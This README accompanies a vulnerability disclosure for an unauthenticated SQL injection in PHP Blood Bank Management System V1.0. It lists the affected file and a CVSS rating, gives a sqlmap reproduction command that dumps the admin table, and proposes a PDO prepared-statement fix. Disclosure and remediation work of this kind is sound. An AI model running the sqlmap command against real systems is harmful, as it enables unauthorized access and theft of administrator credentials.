# PHP Blood Bank Management System V1.0 Unauthorized SQL Injection Vulnerability
Submitter: Hu Tianjia

## Vulnerability Info
- Affected Product: PHP Blood Bank Management System V1.0
- Vulnerable File: /BBfile/bbms.php
- Vulnerability Type: SQL Injection (CWE-89, CVSS 7.5 High)
- Exploit Condition: No login / No authentication required

## Repository Contents
1. `vulnerability-report.md`: Full official vulnerability submission report (English)
2. `/source-code`: Original vulnerable source code & fixed PDO patch file
3. `/screenshots`: All verification screenshots for vulnerability POC
4. `/POC`: SQLmap full running logs, dumped admin account csv, exploit video recording

## Reproduction Command
```bash
python sqlmap.py -u "http://127.0.0.1/bloodbank/BBfile/bbms.php" --data "search=A&search2=NY" -p search --batch -D bloodbank_db -T admin --dump

## Official Repair Solution
Use PDO prepared parameterized statements to completely block SQL injection:

$searchq = $_POST['search'];
$searchqq = $_POST['search2'];
$stmt = $pdo->prepare("SELECT * FROM donate WHERE bloodgroup LIKE :bg AND city LIKE :city");
$stmt->execute([':bg' => "%$searchq%", ':city' => "%$searchqq%"]);
